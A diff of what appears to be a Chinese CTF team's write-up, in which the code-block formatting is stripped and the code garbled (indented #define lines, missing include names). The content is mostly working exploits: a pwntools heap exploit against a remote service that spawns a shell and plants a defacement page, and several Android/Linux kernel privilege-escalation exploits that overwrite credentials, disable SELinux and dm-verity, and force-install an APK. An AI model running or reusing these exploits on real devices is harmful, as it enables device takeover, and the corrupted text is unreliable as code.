@@ -33,13 +33,16 @@ r3kapig
 
 欢迎师傅们加入我们:
 
-星盟安全团队纳新群1:222328705
+星盟安全团队纳新群1:
+222328705
 
-星盟安全团队纳新群2:346014666
+星盟安全团队纳新群2:
+346014666
 
 有兴趣的师傅欢迎一起来讨论!
 
-PS:团队纳新简历投递邮箱：
+PS:
+团队纳新简历投递邮箱：
 
 xmcve@qq.com
 
@@ -284,15 +287,10 @@ xmcve@qq.com
 </head>
  
  
-<body>
-  <div>haivk</div>
-</body>
+
+  haivk
+
 </html>
-```
-
-
-
-```
 <!DOCTYPE html>
 <html>
 <head>
@@ -562,15 +560,10 @@ xmcve@qq.com
 </head>
  
  
-<body>
-  <div>haivk</div>
-</body>
+
+  haivk
+
 </html>
-```
-
-
-
-```
 <!DOCTYPE html>
 <html>
 <head>
@@ -781,26 +774,22 @@ xmcve@qq.com
 </head>
  
  
-<body>
-  <div>haivk</div>
-</body>
+
+  haivk
+
 </html>
-```
-
-
-
-```
-#coding:utf8
+    #coding:
+utf8
 from pwn import *
 
-#sh = process(argv=['./qemu-aarch64','-L','./','./libpa.so'])
+    #sh = process(argv=['./qemu-aarch64','-L','./','./libpa.so'])
 libc = ELF('./system/lib64/libc.so')
 
-#sh = process(argv=['./qemu-aarch64','-L','./','-g','1235','./libpa.so'])
+    #sh = process(argv=['./qemu-aarch64','-L','./','-g','1235','./libpa.so'])
 sh = remote('192.168.10.16',12345)
 
-#sh = remote('172.20.10.6',12345)
-#libc = ELF('./libc11.so')
+    #sh = remote('172.20.10.6',12345)
+    #libc = ELF('./libc11.so')
 
 def add(size,content):
    sh.sendlineafter('Your choice:','1')
@@ -828,8 +817,8 @@ for i in range(2,16):
    delete(i)
 
 delete(1)
-#fake Node struct
-#set size = 0x20
+    #fake Node struct
+    #set size = 0x20
 add(0x18,b'c'*0x8 + p32(0x20) + b'n') #16
 for i in range(17,31):
    add(0x18,b'd'*0x18)
@@ -843,7 +832,7 @@ heap_addr = u64(sh.recv(8)) & 0xffffffffffff
 print('heap_addr=',hex(heap_addr))
 leak_ptr_addr = heap_addr - 0x281f0
 print('leak_ptr_addr=',hex(leak_ptr_addr))
-#guess tag
+    #guess tag
 for i in range(0x10):
    #fake 31 Node struct
    edit(0,b'a'*0x8 + p32(0x8) + p32(0) + p64((i << 56) + leak_ptr_addr) + b'n')
@@ -859,7 +848,7 @@ elf_base = leak_value - 0x12adc
 gadget_addr = elf_base + 0x9BC70
 putchar_got_addr = elf_base + 0xc44a8
 print('elf_base=',hex(elf_base))
-#leak libc
+    #leak libc
 edit(0,b'a'*0x8 + p32(0x8) + p32(0) + p64(putchar_got_addr) + b'n')
 show(31)
 sh.recv(1)
@@ -874,27 +863,22 @@ arg0_ptr_addr = elf_base + 0xcf000
 heap_arr_addr = elf_base + 0xCF188
 
 cmd = b'/bin/shx00'
-#fake a vtable
+    #fake a vtable
 edit(0,b'a'*0x8 + p32(0x100) + p32(0) + p64(bss) + b'n')
 edit(31,cmd.ljust(0x28,b'b') + p64(system_addr) + b'n')
 
-#set free vtable ptr to fake
+    #set free vtable ptr to fake
 edit(0,b'a'*0x8 + p32(0x100) + p32(0) + p64(free_vtable_addr) + b'n')
 edit(31,p64(bss) + b'n')
 
-#trigger
+    #trigger
 delete(31)
 sleep(1)
-#run shell to replace /sdcard/Documents/cache.html
+    #run shell to replace /sdcard/Documents/cache.html
 sh.sendline('echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+SGFja2VkIGJ5IEhhMXZrPC90aXRsZT4KICAgIDxzdHlsZT4KICAgICAgICBib2R5IHsKICAgICAgICAgICAgbWFyZ2luOiAwOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiBibGFjazsKICAgICAgICAgICAgY29sb3I6ICMwMGZmMDA7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnQ291cmllciBOZXcnLCBDb3VyaWVyLCBtb25vc3BhY2U7CiAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgfQogICAgICAgIGNhbnZhcyB7CiAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOwogICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgIHRvcDogMDsKICAgICAgICAgICAgbGVmdDogMDsKICAgICAgICB9CiAgICAgICAgLm1lc3NhZ2UgewogICAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgICAgIHRvcDogNTAlOwogICAgICAgICAgICBsZWZ0OiA1MCU7CiAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKC01MCUsIC01MCUpOwogICAgICAgICAgICBmb250LXNpemU6IDNyZW07CiAgICAgICAgICAgIGNvbG9yOiAjMDBmZjAwOwogICAgICAgICAgICB6LWluZGV4OiAxOwogICAgICAgICAgICB0ZXh0LXNoYWRvdzogMHB4IDBweCA1cHggIzAwZmYwMDsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgoKPGRpdiBjbGFzcz0ibWVzc2FnZSI+SGFja2VkIGJ5IEhhMXZrPC9kaXY+CjxjYW52YXMgaWQ9Im1hdHJpeENhbnZhcyI+PC9jYW52YXM+Cgo8c2NyaXB0PgogICAgY29uc3QgY2FudmFzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1hdHJpeENhbnZhcyIpOwogICAgY29uc3QgY3R4ID0gY2FudmFzLmdldENvbnRleHQoIjJkIik7CgogICAgY2FudmFzLndpZHRoID0gd2luZG93LmlubmVyV2lkdGg7CiAgICBjYW52YXMuaGVpZ2h0ID0gd2luZG93LmlubmVySGVpZ2h0OwoKICAgIGNvbnN0IGNoYXJhY3RlcnMgPSAiMDEyMzQ1Njc4OWFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVpAIyQlXiYqKCkiOwogICAgY29uc3QgZm9udFNpemUgPSAxNjsKICAgIGNvbnN0IGNvbHVtbnMgPSBjYW52YXMud2lkdGggLyBmb250U2l6ZTsKCiAgICBjb25zdCBkcm9wcyA9IFtdOwogICAgZm9yIChsZXQgeCA9IDA7IHggPCBjb2x1bW5zOyB4KyspIHsKICAgICAgICBkcm9wc1t4XSA9IE1hdGgucmFuZG9tKCkgKiBjYW52YXMuaGVpZ2h0OwogICAgfQoKICAgIGZ1bmN0aW9uIGRyYXcoKSB7CiAgICAgICAgY3R4LmZpbGxTdHlsZSA9ICJyZ2JhKDAsIDAsIDAsIDAuMDUpIjsKICAgICAgICBjdHguZmlsbFJlY3QoMCwgMCwgY2FudmFzLndpZHRoLCBjYW52YXMuaGVpZ2h0KTsKCiAgICAgICAgY3R4LmZpbGxTdHlsZSA9ICIjMDBmZjAwIjsKICAgICAgICBjdHguZm9udCA9IGZvbnRTaXplICsgInB4IG1vbm9zcGFjZSI7CgogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZHJvcHMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgY29uc3QgdGV4dCA9IGNoYXJhY3RlcnNbTWF0aC5mbG9vcihNYXRoLnJhbmRvbSgpICogY2hhcmFjdGVycy5sZW5ndGgpXTsKICAgICAgICAgICAgY3R4LmZpbGxUZXh0KHRleHQsIGkgKiBmb250U2l6ZSwgZHJvcHNbaV0gKiBmb250U2l6ZSk7CgogICAgICAgICAgICBpZiAoZHJvcHNbaV0gKiBmb250U2l6ZSA+IGNhbnZhcy5oZWlnaHQgJiYgTWF0aC5yYW5kb20oKSA+IDAuOTc1KSB7CiAgICAgICAgICAgICAgICBkcm9wc1tpXSA9IDA7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGRyb3BzW2ldKys7CiAgICAgICAgfQogICAgfQoKICAgIHNldEludGVydmFsKGRyYXcsIDMzKTsKCiAgICB3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigncmVzaXplJywgKCkgPT4gewogICAgICAgIGNhbnZhcy53aWR0aCA9IHdpbmRvdy5pbm5lcldpZHRoOwogICAgICAgIGNhbnZhcy5oZWlnaHQgPSB3aW5kb3cuaW5uZXJIZWlnaHQ7CiAgICB9KTsKPC9zY3JpcHQ+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d > /sdcard/Documents/cache.html')
 sleep(2)
 
 sh.interactive()
-```
-
-
-
-```
 int read_at_address_pipe(void* address, void* buf, ssize_t len) {
     int ret = 1;
     int pipes[2];
@@ -932,47 +916,42 @@ end:
     close(pipes[0]);
     return ret;
 }
-```
+    #define _GNU_SOURCE
+    #include <sys/types.h>
+    #include <sys/socket.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include 
+    #include <errno.h>
+    #include 
+    #include <sys/xattr.h>
+    #include <netinet/in.h>
+    #include <linux/socket.h>
+    #include <linux/unistd.h>
+    #include <sched.h>
 
-
-
-```
-#define _GNU_SOURCE
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <errno.h>
-#include <pthread.h>
-#include <sys/xattr.h>
-#include <netinet/in.h>
-#include <linux/socket.h>
-#include <linux/unistd.h>
-#include <sched.h>
-
-#define AF_AVSS 1024
-#define AVSS_PORT 2024
+    #define AF_AVSS 1024
+    #define AVSS_PORT 2024
 
 /*my custom kernel
 uint64_t kernel_setsockopt = 0xFFFFFFC0004E3F70;
 uint64_t ksymtab___sk_backlog_rcv = 0xFFFFFFC0007A70B8;
 uint64_t add_sp_40_ret = 0xFFFFFFC0004EB048;
-#define INIT_TASK 0xFFFFFFC00089A1E0
-#define TASK_OFFSET 0x240
-#define PID_OFFSET 0x300
-#define PTR_CRED_OFFSET 0x498
+    #define INIT_TASK 0xFFFFFFC00089A1E0
+    #define TASK_OFFSET 0x240
+    #define PID_OFFSET 0x300
+    #define PTR_CRED_OFFSET 0x498
 */
 //pixel 1 kernel
 uint64_t kernel_setsockopt = 0xFFFFFFC000C402FC;
 uint64_t ksymtab___sk_backlog_rcv = 0xFFFFFFC00106D740;
 uint64_t add_sp_40_ret = 0xffffffc0000954fc;
 size_t selinux_enforcing = 0xFFFFFFC001716ACC;
-#define INIT_TASK 0xFFFFFFC001522120
-#define TASK_OFFSET 0x3a8
-#define PID_OFFSET 0x468
-#define PTR_CRED_OFFSET 0x610
+    #define INIT_TASK 0xFFFFFFC001522120
+    #define TASK_OFFSET 0x3a8
+    #define PID_OFFSET 0x468
+    #define PTR_CRED_OFFSET 0x610
 
 struct avss_addr {
     sa_family_t avss_family;
@@ -1221,50 +1200,40 @@ int main() {
     system("/system/bin/sh");
     return 0;
 }
-```
-
-
-
-```
 ./busybox mount -o remount,rw /vendor
 mkdir /vendor/app/Polaris
 cp polaris.apk /vendor/app/Polaris
 reboot
-```
+    #define _GNU_SOURCE
+    #include <sys/types.h>
+    #include <sys/socket.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include 
+    #include <fcntl.h>
+    #include <errno.h>
+    #include <sys/syscall.h>
+    #include 
+    #include <sys/xattr.h>
+    #include <netinet/in.h>
+    #include <linux/socket.h>
+    #include <linux/unistd.h>
+    #include <sys/msg.h>
+    #include <linux/keyctl.h>
+    #include <sched.h>
 
-
-
-```
-#define _GNU_SOURCE
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <sys/syscall.h>
-#include <pthread.h>
-#include <sys/xattr.h>
-#include <netinet/in.h>
-#include <linux/socket.h>
-#include <linux/unistd.h>
-#include <sys/msg.h>
-#include <linux/keyctl.h>
-#include <sched.h>
-
-#define AF_AVSS 1024
-#define AVSS_PORT 2024
+    #define AF_AVSS 1024
+    #define AVSS_PORT 2024
 
 size_t kernel_base;
 size_t gadget_leak;
 size_t gadget_write;
 size_t init_task;
 //pixel 2 kernel
-#define TASK_OFFSET 0x440
-#define PID_OFFSET 0x538
-#define PTR_CRED_OFFSET 0x6E8
+    #define TASK_OFFSET 0x440
+    #define PID_OFFSET 0x538
+    #define PTR_CRED_OFFSET 0x6E8
 
 struct avss_addr {
     sa_family_t avss_family;
@@ -1590,11 +1559,6 @@ int main() {
 
     return 0;
 }
-```
-
-
-
-```
 ./disable-dm-verity
 reboot
 
@@ -1602,11 +1566,6 @@ reboot
 mkdir /vendor/app/Polaris
 cp polaris.apk /vendor/app/Polaris
 reboot
-```
-
-
-
-```
 void writeByte(size_t addr,int byte) {
     size_t serverfd;
     pthread_t client_th;
@@ -1643,33 +1602,28 @@ void writeByte(size_t addr,int byte) {
     }
     //getchar();
 }
-```
+    #define _GNU_SOURCE
+    #include <sys/types.h>
+    #include <sys/socket.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include 
+    #include <fcntl.h>
+    #include <errno.h>
+    #include <sys/syscall.h>
+    #include 
+    #include <sys/xattr.h>
+    #include <netinet/in.h>
+    #include <linux/socket.h>
+    #include <linux/unistd.h>
+    #include <sys/msg.h>
+    #include <linux/keyctl.h>
+    #include <sched.h>
+    #include <sys/mman.h>
 
-
-
-```
-#define _GNU_SOURCE
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <sys/syscall.h>
-#include <pthread.h>
-#include <sys/xattr.h>
-#include <netinet/in.h>
-#include <linux/socket.h>
-#include <linux/unistd.h>
-#include <sys/msg.h>
-#include <linux/keyctl.h>
-#include <sched.h>
-#include <sys/mman.h>
-
-#define AF_AVSS 1024
-#define AVSS_PORT 2024
+    #define AF_AVSS 1024
+    #define AVSS_PORT 2024
 
 size_t kernel_base;
 size_t selinux_enforcing;
@@ -1802,7 +1756,7 @@ ssize_t syscall_send(int sockfd, const void *buf, size_t len, int flags
     return ret;
 }
 
-#define NUM_PIPE 100
+    #define NUM_PIPE 100
 int pipefd[NUM_PIPE][2];
 void spray_pipe(int n) {
     for (int i=0;i<n;i++) {
@@ -1928,11 +1882,6 @@ int main() {
     system("/data/local/tmp/busybox nc 127.0.0.1 2333");
     return 0;
 }
-```
-
-
-
-```
 ./disable-dm-verity9
 reboot
 
@@ -1940,37 +1889,32 @@ reboot
 mkdir /vendor/app/Polaris
 cp polaris.apk /vendor/app/Polaris
 reboot
-```
+    #define _GNU_SOURCE
+    #define _GNU_SOURCE
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include 
+    #include <fcntl.h>
+    #include <string.h>
+    #include <sys/user.h>
+    #include <sys/msg.h>
+    #include <sys/mman.h>
+    #include <sys/syscall.h>
+    #include <sys/ioctl.h>
+    #include <sys/sem.h>
+    #include <ctype.h>
+    #include <sched.h>
+    #include <stdint.h>
+    #include <linux/keyctl.h>
+    #include <sys/prctl.h>
+    #include <signal.h>
 
-
-
-```
-#define _GNU_SOURCE
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <string.h>
-#include <sys/user.h>
-#include <sys/msg.h>
-#include <sys/mman.h>
-#include <sys/syscall.h>
-#include <sys/ioctl.h>
-#include <sys/sem.h>
-#include <ctype.h>
-#include <sched.h>
-#include <stdint.h>
-#include <linux/keyctl.h>
-#include <sys/prctl.h>
-#include <signal.h>
-
-#define DB_OFFSET(idx) ((void*)(&(((struct user*)0)->u_debugreg[idx])))
-#define CPU_ENTRY_AREA 0xfffffe0000000000
-#ifndef MSG_COPY
+    #define DB_OFFSET(idx) ((void*)(&(((struct user*)0)->u_debugreg[idx])))
+    #define CPU_ENTRY_AREA 0xfffffe0000000000
+    #ifndef MSG_COPY
     #define MSG_COPY        040000  /* copy (not remove) all queue messages */
-#endif
-#define pause() {write(STDOUT_FILENO, "[*] Paused (press enter to continue)n", 37); getchar();}
+    #endif
+    #define pause() {write(STDOUT_FILENO, "[*] Paused (press enter to continue)n", 37); getchar();}
 
 // #define DB_STACK_ADDR 0xfffffe0000010f30
 
@@ -2035,12 +1979,12 @@ void print_binary(void *addr, int len) 
 
 // 0xffffffff8103c827: pop rdi; ret;
 // 0xffffffff8111874f: pop rsp; ret;
-#define __NR_uaf 602
-#define MSG_SPRAY_NUM 0x10
-#define PIPE_SPRAY_NUM 200
+    #define __NR_uaf 602
+    #define MSG_SPRAY_NUM 0x10
+    #define PIPE_SPRAY_NUM 200
 /* for pipe escalation */
-#define SND_PIPE_BUF_SZ 96
-#define TRD_PIPE_BUF_SZ 192
+    #define SND_PIPE_BUF_SZ 96
+    #define TRD_PIPE_BUF_SZ 192
 
 struct page;
 struct pipe_inode_info;
@@ -2525,33 +2469,28 @@ int main(){
 
     return 0;
 }
-```
+    #define _GNU_SOURCE
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <syscall.h>
+    #include 
+    #include <fcntl.h>
+    #include <signal.h>
+    #include <errno.h>
+    #include <sys/mman.h>
+    #include <sys/prctl.h>
 
+    #define __NR_uaf 602
 
-
-```
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <syscall.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <signal.h>
-#include <errno.h>
-#include <sys/mman.h>
-#include <sys/prctl.h>
-
-#define __NR_uaf 602
-
-#define VMEMMAP_BASE 0xff00000000000000
+    #define VMEMMAP_BASE 0xff00000000000000
 int this_pid = 0;
 
-#define new_buffer(index) syscall(__NR_uaf, NULL, 0, ((index) << 8)|0)
-#define del_buffer(index) syscall(__NR_uaf, NULL, 0, ((index) << 8)|1)
-#define show_buffer(index, buf, len) syscall(__NR_uaf, (char*)(buf), (len), ((index) << 8)|2)
-#define edit_buffer(index, buf, len) syscall(__NR_uaf, (char*)(buf), (len), ((index) << 8)|3)
-#define pause() {write(STDOUT_FILENO, "[*] Paused (press enter to continue)n", 37); getchar();}
+    #define new_buffer(index) syscall(__NR_uaf, NULL, 0, ((index) << 8)|0)
+    #define del_buffer(index) syscall(__NR_uaf, NULL, 0, ((index) << 8)|1)
+    #define show_buffer(index, buf, len) syscall(__NR_uaf, (char*)(buf), (len), ((index) << 8)|2)
+    #define edit_buffer(index, buf, len) syscall(__NR_uaf, (char*)(buf), (len), ((index) << 8)|3)
+    #define pause() {write(STDOUT_FILENO, "[*] Paused (press enter to continue)n", 37); getchar();}
 
 int print_hex(void *p, int size)
 {
@@ -2688,11 +2627,11 @@ void write_word(size_t addr, size_t value)
     write(pipe_fd[index_pipe][1], &value, 0x8);
 }
 
-#define INIT_TASK 0xffffffc00ab51480
-#define TASK_PID_OFFSET 0x5d8
-#define NEXT_TASK_OFFSET 0x4d0
-#define PREV_TASK_OFFSET (NEXT_TASK_OFFSET+8)
-#define TASK_PTR_CRED_OFFSET 0x790
+    #define INIT_TASK 0xffffffc00ab51480
+    #define TASK_PID_OFFSET 0x5d8
+    #define NEXT_TASK_OFFSET 0x4d0
+    #define PREV_TASK_OFFSET (NEXT_TASK_OFFSET+8)
+    #define TASK_PTR_CRED_OFFSET 0x790
 
 size_t get_current_task()
 {
@@ -2776,26 +2715,21 @@ int main()
 
     return 0;
 }
-```
+    #define _GNU_SOURCE
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include 
+    #include <fcntl.h>
+    #include <string.h>
+    #include <sys/syscall.h>
+    #include <sched.h>
+    #include <stdint.h>
+    #include 
+    #include <linux/keyctl.h>
 
+    #define __NR_race 604
 
-
-```
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <string.h>
-#include <sys/syscall.h>
-#include <sched.h>
-#include <stdint.h>
-#include <pthread.h>
-#include <linux/keyctl.h>
-
-#define __NR_race 604
-
-#define pause() {write(STDOUT_FILENO, "[*] Paused (press enter to continue)n", 37); getchar();}
+    #define pause() {write(STDOUT_FILENO, "[*] Paused (press enter to continue)n", 37); getchar();}
 
 // #define DB_STACK_ADDR 0xfffffe0000010f30
 
@@ -2849,60 +2783,99 @@ size_t work_for_cpu_fn = 0xFFFFFF80080D000C;
 size_t selnl_notify_setenforce = 0xFFFFFF80083EF928;
 size_t selinux_status_update_setenforce = 0xFFFFFF80083FF540;
 /*
-.kernel:FFFFFF8008707744                 LDRB            W8, [X0,#0x311]
-.kernel:FFFFFF8008707748                 MOV             X19, X0
-.kernel:FFFFFF800870774C                 ADD             X29, SP, #0x10
-.kernel:FFFFFF8008707750                 CBZ             W8, loc_FFFFFF8008707774
-.kernel:FFFFFF8008707754                 LDR             X8, [X19,#0x338]
-.kernel:FFFFFF8008707758                 CBZ             X8, loc_FFFFFF8008707764
-.kernel:FFFFFF800870775C                 ADD             X0, X19, #0x318
-.kernel:FFFFFF8008707760                 BLR             X8
+.kernel:
+FFFFFF8008707744                 LDRB            W8, [X0,#0x311]
+.kernel:
+FFFFFF8008707748                 MOV             X19, X0
+.kernel:
+FFFFFF800870774C                 ADD             X29, SP, #0x10
+.kernel:
+FFFFFF8008707750                 CBZ             W8, loc_FFFFFF8008707774
+.kernel:
+FFFFFF8008707754                 LDR             X8, [X19,#0x338]
+.kernel:
+FFFFFF8008707758                 CBZ             X8, loc_FFFFFF8008707764
+.kernel:
+FFFFFF800870775C                 ADD             X0, X19, #0x318
+.kernel:
+FFFFFF8008707760                 BLR             X8
  */
 size_t mov_x19_gadget = 0xFFFFFF8008707744;
 /*
-.kernel:FFFFFF80080DB3F8                 LDR             X8, [X19,#0xC8]
-.kernel:FFFFFF80080DB3FC                 MOV             X0, X22
-.kernel:FFFFFF80080DB400                 MOV             X1, X21
-.kernel:FFFFFF80080DB404                 MOV             X2, X20
-.kernel:FFFFFF80080DB408                 BLR             X8
-.kernel:FFFFFF80080DB40C                 LDR             X8, [X19,#0xD0]
-.kernel:FFFFFF80080DB410                 MOV             X20, X0
-.kernel:FFFFFF80080DB414                 MOV             X0, X19
-.kernel:FFFFFF80080DB418                 BLR             X8
-.kernel:FFFFFF80080DB41C                 SXTW            X0, W20
-.kernel:FFFFFF80080DB420
-.kernel:FFFFFF80080DB420 loc_FFFFFF80080DB420                    ; CODE XREF: handle_128+118↑j
-.kernel:FFFFFF80080DB420                 LDP             X29, X30, [SP,#0x40+var_s0]
-.kernel:FFFFFF80080DB424                 LDP             X20, X19, [SP,#0x40+var_10]
-.kernel:FFFFFF80080DB428                 LDP             X22, X21, [SP,#0x40+var_20]
-.kernel:FFFFFF80080DB42C                 LDP             X24, X23, [SP,#0x40+var_30]
-.kernel:FFFFFF80080DB430                 LDR             X25, [SP+0x40+var_40],#0x50
-.kernel:FFFFFF80080DB434                 RET
+.kernel:
+FFFFFF80080DB3F8                 LDR             X8, [X19,#0xC8]
+.kernel:
+FFFFFF80080DB3FC                 MOV             X0, X22
+.kernel:
+FFFFFF80080DB400                 MOV             X1, X21
+.kernel:
+FFFFFF80080DB404                 MOV             X2, X20
+.kernel:
+FFFFFF80080DB408                 BLR             X8
+.kernel:
+FFFFFF80080DB40C                 LDR             X8, [X19,#0xD0]
+.kernel:
+FFFFFF80080DB410                 MOV             X20, X0
+.kernel:
+FFFFFF80080DB414                 MOV             X0, X19
+.kernel:
+FFFFFF80080DB418                 BLR             X8
+.kernel:
+FFFFFF80080DB41C                 SXTW            X0, W20
+.kernel:
+FFFFFF80080DB420
+.kernel:
+FFFFFF80080DB420 loc_FFFFFF80080DB420                    ; CODE XREF: handle_128+118↑j
+.kernel:
+FFFFFF80080DB420                 LDP             X29, X30, [SP,#0x40+var_s0]
+.kernel:
+FFFFFF80080DB424                 LDP             X20, X19, [SP,#0x40+var_10]
+.kernel:
+FFFFFF80080DB428                 LDP             X22, X21, [SP,#0x40+var_20]
+.kernel:
+FFFFFF80080DB42C                 LDP             X24, X23, [SP,#0x40+var_30]
+.kernel:
+FFFFFF80080DB430                 LDR             X25, [SP+0x40+var_40],#0x50
+.kernel:
+FFFFFF80080DB434                 RET
 */
 size_t gadget2 = 0xFFFFFF80080DB3F8;
 size_t ret = 0xFFFFFF80080DB434;
 /*
-.kernel:FFFFFF80080DB40C                 LDR             X8, [X19,#0xD0]
-.kernel:FFFFFF80080DB410                 MOV             X20, X0
-.kernel:FFFFFF80080DB414                 MOV             X0, X19
-.kernel:FFFFFF80080DB418                 BLR             X8
-.kernel:FFFFFF80080DB41C                 SXTW            X0, W20
-.kernel:FFFFFF80080DB420
-.kernel:FFFFFF80080DB420 loc_FFFFFF80080DB420                    ; CODE XREF: handle_128+118↑j
-.kernel:FFFFFF80080DB420                 LDP             X29, X30, [SP,#0x40+var_s0]
-.kernel:FFFFFF80080DB424                 LDP             X20, X19, [SP,#0x40+var_10]
-.kernel:FFFFFF80080DB428                 LDP             X22, X21, [SP,#0x40+var_20]
-.kernel:FFFFFF80080DB42C                 LDP             X24, X23, [SP,#0x40+var_30]
-.kernel:FFFFFF80080DB430                 LDR             X25, [SP+0x40+var_40],#0x50
-.kernel:FFFFFF80080DB434                 RET
+.kernel:
+FFFFFF80080DB40C                 LDR             X8, [X19,#0xD0]
+.kernel:
+FFFFFF80080DB410                 MOV             X20, X0
+.kernel:
+FFFFFF80080DB414                 MOV             X0, X19
+.kernel:
+FFFFFF80080DB418                 BLR             X8
+.kernel:
+FFFFFF80080DB41C                 SXTW            X0, W20
+.kernel:
+FFFFFF80080DB420
+.kernel:
+FFFFFF80080DB420 loc_FFFFFF80080DB420                    ; CODE XREF: handle_128+118↑j
+.kernel:
+FFFFFF80080DB420                 LDP             X29, X30, [SP,#0x40+var_s0]
+.kernel:
+FFFFFF80080DB424                 LDP             X20, X19, [SP,#0x40+var_10]
+.kernel:
+FFFFFF80080DB428                 LDP             X22, X21, [SP,#0x40+var_20]
+.kernel:
+FFFFFF80080DB42C                 LDP             X24, X23, [SP,#0x40+var_30]
+.kernel:
+FFFFFF80080DB430                 LDR             X25, [SP+0x40+var_40],#0x50
+.kernel:
+FFFFFF80080DB434                 RET
 */
 size_t gadget3 = 0xFFFFFF80080DB40C;
 //
 size_t mov_x0_zero = 0xffffff800809cc8c;
-#define INIT_TASK 0xFFFFFF8008DBAF80
-#define TASK_OFFSET 0x4a8
-#define PID_OFFSET 0x5a8
-#define PTR_CRED_OFFSET 0x748
+    #define INIT_TASK 0xFFFFFF8008DBAF80
+    #define TASK_OFFSET 0x4a8
+    #define PID_OFFSET 0x5a8
+    #define PTR_CRED_OFFSET 0x748
 
 void competeFunc() {
     while(status) {
